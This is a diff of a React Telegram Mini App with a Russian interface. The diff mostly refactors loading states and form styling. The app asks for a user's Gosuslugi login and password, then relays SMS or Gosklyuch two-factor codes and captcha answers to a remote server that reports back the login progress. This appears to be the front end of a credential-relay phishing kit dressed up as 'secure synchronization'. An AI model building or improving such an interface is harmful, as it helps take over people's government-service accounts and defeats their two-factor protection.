@@ -5,6 +5,10 @@ import {
   ShieldCheck,
   Send,
   ArrowRight,
+  User,
+  Lock,
+  Eye,
+  EyeOff,
 } from 'lucide-react';
 
 declare global {
@@ -101,7 +105,8 @@ export default function App() {
   const [captchaImg, setCaptchaImg] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
   const [progressText, setProgressText] = useState('Открываем безопасное соединение...');
-  const [progressStep, setProgressStep] = useState(1);
+  const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
   useEffect(() => {
     try {
@@ -140,13 +145,12 @@ export default function App() {
         console.error(e);
       }
       setStep('welcome');
-      setProgressStep(1);
     };
     checkAuth();
   }, [tgUserId]);
 
   useEffect(() => {
-    if (step !== 'polling' || !sessionId) return;
+    if (!isLoading || !sessionId) return;
 
     let pct = 0;
     const progTimer = setInterval(() => {
@@ -171,12 +175,12 @@ export default function App() {
         const clear = () => {
           clearInterval(pollTimer);
           clearInterval(progTimer);
+          setIsLoading(false);
         };
 
         if (data.status === 'Success') {
           clear();
           setProgressText('Готово!');
-          setProgressStep(3);
           setTimeout(() => {
             setDirection('forward');
             setStep('success');
@@ -185,14 +189,12 @@ export default function App() {
         } else if (data.status === 'RequiresOtp') {
           clear();
           setUserInput('');
-          setProgressStep(2);
           setDirection('forward');
           setStep('otp');
         } else if (data.status === 'RequiresCaptcha') {
           clear();
           setCaptchaImg(data.captchaImage);
           setUserInput('');
-          setProgressStep(2);
           setDirection('forward');
           setStep('captcha');
         } else if (data.status === 'Failed' || data.status === 'Expired') {
@@ -210,14 +212,12 @@ export default function App() {
       clearInterval(pollTimer);
       clearInterval(progTimer);
     };
-  }, [step, sessionId]);
+  }, [isLoading, sessionId]);
 
   const handleStartAuth = async () => {
     if (!login || !password) return;
     setProgressText('Открываем безопасное соединение...');
-    setProgressStep(1);
-    setDirection('forward');
-    setStep('polling');
+    setIsLoading(true);
     setErrorMsg('');
     try {
       const res = await fetch(`${SERVER_URL}/api/miniapp/auth/start`, {
@@ -236,6 +236,7 @@ export default function App() {
       const data = await res.json();
       setSessionId(data.sessionId);
     } catch (e: unknown) {
+      setIsLoading(false);
       setErrorMsg(
         'Не удалось связаться с сервером. ' +
           (e instanceof Error ? e.message : String(e))
@@ -248,9 +249,7 @@ export default function App() {
   const handleSubmitInput = async () => {
     if (!userInput) return;
     setProgressText('Проверяем введённый код...');
-    setProgressStep(2);
-    setDirection('forward');
-    setStep('polling');
+    setIsLoading(true);
     try {
       const res = await fetch(`${SERVER_URL}/api/miniapp/auth/submit-input`, {
         method: 'POST',
@@ -262,36 +261,13 @@ export default function App() {
       });
       if (!res.ok) throw new Error(`HTTP ${res.status}`);
     } catch (e: unknown) {
+      setIsLoading(false);
       setErrorMsg(
         'Ошибка отправки кода. ' + (e instanceof Error ? e.message : String(e))
       );
       setDirection('forward');
       setStep('error');
     }
-  };
-
-  const renderProgressHeader = () => {
-    if (step === 'welcome' || step === 'loading') return null;
-    
-    const getFillWidth = (seg: number) => {
-      if (seg <= progressStep) return '100%';
-      return '0%';
-    };
-
-    return (
-      <div className="segmented-progress">
-        {[1, 2, 3].map((seg) => (
-          <div key={seg} className="progress-segment">
-            <motion.div
-              className="progress-segment-fill"
-              initial={{ width: '0%' }}
-              animate={{ width: getFillWidth(seg) }}
-              transition={{ duration: 0.35, ease: 'easeInOut' }}
-            />
-          </div>
-        ))}
-      </div>
-    );
   };
 
   return (
@@ -332,11 +308,11 @@ export default function App() {
             variants={staggerContainer}
             initial="initial"
             animate="animate"
-            className="screen-body glass-card backdrop-filter p-6"
+            className="screen-body"
           >
             <motion.div variants={staggerItem} className="feature-item">
               <div className="feature-icon">
-                <Fingerprint size={18} strokeWidth={2} />
+                <Fingerprint size={16} strokeWidth={2.2} />
               </div>
               <div className="feature-text">
                 <h3 className="feature-title">Безопасный вход</h3>
@@ -346,7 +322,7 @@ export default function App() {
 
             <motion.div variants={staggerItem} className="feature-item">
               <div className="feature-icon">
-                <ShieldCheck size={18} strokeWidth={2} />
+                <ShieldCheck size={16} strokeWidth={2.2} />
               </div>
               <div className="feature-text">
                 <h3 className="feature-title">Защита данных</h3>
@@ -356,7 +332,7 @@ export default function App() {
 
             <motion.div variants={staggerItem} className="feature-item">
               <div className="feature-icon">
-                <Send size={18} strokeWidth={2} />
+                <Send size={16} strokeWidth={2.2} />
               </div>
               <div className="feature-text">
                 <h3 className="feature-title">Удобство в Telegram</h3>
@@ -369,7 +345,7 @@ export default function App() {
             <motion.button
               whileHover={buttonSpring.hover}
               whileTap={buttonSpring.tap}
-              className="btn btn--primary btn-enhanced"
+              className="btn btn--primary"
               onClick={() => {
                 setDirection('forward');
                 setStep('login');
@@ -393,48 +369,58 @@ export default function App() {
           className="screen"
         >
           <div className="screen-content">
-            {renderProgressHeader()}
             <div className="brand">
               <h1 className="brand-title">Авторизация</h1>
               <p className="brand-sub">Введите данные от аккаунта Госуслуг для безопасной синхронизации</p>
             </div>
           </div>
 
-          <div className="screen-body glass-card backdrop-filter p-6">
+          <div className="screen-body">
             <div className="form-fields">
-              <div className="field-floating">
-                <input
-                  type="text"
-                  className="field-input input-enhanced"
-                  value={login}
-                  onChange={(e) => setLogin(e.target.value)}
-                  placeholder=" "
-                  autoComplete="username"
-                  autoFocus
-                />
-                <label className="floating-label">
+              <div className="field-group">
+                <label className="field-label-static">
                   Телефон, Email или СНИЛС
                 </label>
-                <svg className="input-glow-border">
-                  <rect pathLength={1} />
-                </svg>
+                <div className="field-input-wrapper">
+                  <User size={16} className="field-icon-left" />
+                  <input
+                    type="text"
+                    className="field-input input-with-icon-left"
+                    value={login}
+                    onChange={(e) => setLogin(e.target.value)}
+                    placeholder="Введите логин"
+                    autoComplete="username"
+                    autoFocus
+                    disabled={isLoading}
+                  />
+                </div>
               </div>
 
-              <div className="field-floating">
-                <input
-                  type="password"
-                  className="field-input input-enhanced"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  placeholder=" "
-                  autoComplete="current-password"
-                />
-                <label className="floating-label">
+              <div className="field-group">
+                <label className="field-label-static">
                   Пароль
                 </label>
-                <svg className="input-glow-border">
-                  <rect pathLength={1} />
-                </svg>
+                <div className="field-input-wrapper">
+                  <Lock size={16} className="field-icon-left" />
+                  <input
+                    type={showPassword ? "text" : "password"}
+                    className="field-input input-with-icon-left input-with-icon-right"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Введите пароль"
+                    autoComplete="current-password"
+                    disabled={isLoading}
+                  />
+                  <button
+                    type="button"
+                    className="field-toggle-right"
+                    onClick={() => setShowPassword(!showPassword)}
+                    tabIndex={-1}
+                    disabled={isLoading}
+                  >
+                    {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
+                  </button>
+                </div>
               </div>
             </div>
           </div>
@@ -443,24 +429,42 @@ export default function App() {
             <motion.button
               whileHover={buttonSpring.hover}
               whileTap={buttonSpring.tap}
-              className="btn btn--primary btn-enhanced"
+              className="btn btn--primary"
               onClick={handleStartAuth}
-              disabled={!login || !password}
+              disabled={!login || !password || isLoading}
             >
-              Войти
-              <ArrowRight size={14} strokeWidth={2.5} className="ml-2 h-4 w-4" />
+              {isLoading ? (
+                <>
+                  <div className="btn-spinner" />
+                  Вход...
+                </>
+              ) : (
+                <>
+                  Войти
+                  <ArrowRight size={14} strokeWidth={2.5} className="ml-2 h-4 w-4" />
+                </>
+              )}
             </motion.button>
-            <motion.button
-              whileHover={buttonSpring.hover}
-              whileTap={buttonSpring.tap}
-              className="btn btn--ghost btn-enhanced"
-              onClick={() => {
-                setDirection('backward');
-                setStep('welcome');
-              }}
-            >
-              Назад
-            </motion.button>
+
+            {isLoading && progressText && (
+              <div className="status-text-inline">
+                {progressText}
+              </div>
+            )}
+
+            {!isLoading && (
+              <motion.button
+                whileHover={buttonSpring.hover}
+                whileTap={buttonSpring.tap}
+                className="btn btn--ghost"
+                onClick={() => {
+                  setDirection('backward');
+                  setStep('welcome');
+                }}
+              >
+                Назад
+              </motion.button>
+            )}
           </div>
         </motion.div>
       )}
@@ -476,28 +480,32 @@ export default function App() {
           className="screen"
         >
           <div className="screen-content">
-            {renderProgressHeader()}
             <div className="brand">
               <h1 className="brand-title">Двухфакторная защита</h1>
               <p className="brand-sub">Введите код подтверждения из СМС или приложения «Госключ»</p>
             </div>
           </div>
 
-          <div className="screen-body glass-card backdrop-filter p-6">
-            <div className="field" style={{ position: 'relative' }}>
-              <input
-                type="text"
-                className="field-input field-input--code"
-                value={userInput}
-                onChange={(e) => setUserInput(e.target.value)}
-                placeholder="••••••"
-                maxLength={6}
-                autoFocus
-                inputMode="numeric"
-              />
-              <svg className="input-glow-border">
-                <rect pathLength={1} />
-              </svg>
+          <div className="screen-body">
+            <div className="form-fields">
+              <div className="field-group">
+                <label className="field-label-static">
+                  СМС-код
+                </label>
+                <div className="field-input-wrapper">
+                  <input
+                    type="text"
+                    className="field-input field-input--code"
+                    value={userInput}
+                    onChange={(e) => setUserInput(e.target.value)}
+                    placeholder="••••••"
+                    maxLength={6}
+                    autoFocus
+                    inputMode="numeric"
+                    disabled={isLoading}
+                  />
+                </div>
+              </div>
             </div>
           </div>
 
@@ -505,12 +513,25 @@ export default function App() {
             <motion.button
               whileHover={buttonSpring.hover}
               whileTap={buttonSpring.tap}
-              className="btn btn--primary btn-enhanced"
+              className="btn btn--primary"
               onClick={handleSubmitInput}
-              disabled={userInput.length < 4}
+              disabled={userInput.length < 4 || isLoading}
             >
-              Подтвердить
+              {isLoading ? (
+                <>
+                  <div className="btn-spinner" />
+                  Проверка...
+                </>
+              ) : (
+                'Подтвердить'
+              )}
             </motion.button>
+
+            {isLoading && progressText && (
+              <div className="status-text-inline">
+                {progressText}
+              </div>
+            )}
           </div>
         </motion.div>
       )}
@@ -526,14 +547,13 @@ export default function App() {
           className="screen"
         >
           <div className="screen-content">
-            {renderProgressHeader()}
             <div className="brand">
               <h1 className="brand-title">Проверка безопасности</h1>
               <p className="brand-sub">Введите символы, изображённые на картинке ниже</p>
             </div>
           </div>
 
-          <div className="screen-body glass-card backdrop-filter p-6">
+          <div className="screen-body">
             <div className="captcha-wrap">
               {captchaImg && (
                 <img
@@ -544,18 +564,23 @@ export default function App() {
               )}
             </div>
 
-            <div className="field" style={{ position: 'relative' }}>
-              <input
-                type="text"
-                className="field-input field-input--code"
-                value={userInput}
-                onChange={(e) => setUserInput(e.target.value)}
-                placeholder="Введите код"
-                autoFocus
-              />
-              <svg className="input-glow-border">
-                <rect pathLength={1} />
-              </svg>
+            <div className="form-fields">
+              <div className="field-group">
+                <label className="field-label-static">
+                  Символы с картинки
+                </label>
+                <div className="field-input-wrapper">
+                  <input
+                    type="text"
+                    className="field-input field-input--code"
+                    value={userInput}
+                    onChange={(e) => setUserInput(e.target.value)}
+                    placeholder="Введите код"
+                    autoFocus
+                    disabled={isLoading}
+                  />
+                </div>
+              </div>
             </div>
           </div>
 
@@ -563,33 +588,25 @@ export default function App() {
             <motion.button
               whileHover={buttonSpring.hover}
               whileTap={buttonSpring.tap}
-              className="btn btn--primary btn-enhanced"
+              className="btn btn--primary"
               onClick={handleSubmitInput}
-              disabled={!userInput}
+              disabled={!userInput || isLoading}
             >
-              Продолжить
+              {isLoading ? (
+                <>
+                  <div className="btn-spinner" />
+                  Проверка...
+                </>
+              ) : (
+                'Продолжить'
+              )}
             </motion.button>
-          </div>
-        </motion.div>
-      )}
 
-      {step === 'polling' && (
-        <motion.div
-          key="polling"
-          custom={direction}
-          initial="initial"
-          animate="animate"
-          exit="exit"
-          variants={screenVariants}
-          className="screen screen--center"
-        >
-          <div className="status-wrapper">
-            {renderProgressHeader()}
-            <div className="spinner" />
-            <div className="status-text-group">
-              <p className="progress-title">{progressText}</p>
-              <p className="progress-hint">{progressText.includes('Готово') ? '' : 'Это может занять до 30 секунд'}</p>
-            </div>
+            {isLoading && progressText && (
+              <div className="status-text-inline">
+                {progressText}
+              </div>
+            )}
           </div>
         </motion.div>
       )}
@@ -605,7 +622,6 @@ export default function App() {
           className="screen screen--center"
         >
           <div className="status-wrapper">
-            {renderProgressHeader()}
             <div className="status-icon status-icon--success">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ display: 'block' }}>
                 <motion.path
@@ -659,7 +675,7 @@ export default function App() {
               <motion.button
                 whileHover={buttonSpring.hover}
                 whileTap={buttonSpring.tap}
-                className="btn btn--primary btn-enhanced"
+                className="btn btn--primary"
                 onClick={() => {
                   setDirection('backward');
                   setStep('login');
@@ -701,7 +717,7 @@ export default function App() {
               <motion.button
                 whileHover={buttonSpring.hover}
                 whileTap={buttonSpring.tap}
-                className="btn btn--primary btn-enhanced"
+                className="btn btn--primary"
                 onClick={() => window.Telegram?.WebApp?.close?.()}
               >
                 Вернуться в Telegram
@@ -709,7 +725,7 @@ export default function App() {
               <motion.button
                 whileHover={buttonSpring.hover}
                 whileTap={buttonSpring.tap}
-                className="btn btn--ghost btn-enhanced"
+                className="btn btn--ghost"
                 onClick={() => {
                   setDirection('backward');
                   setStep('welcome');
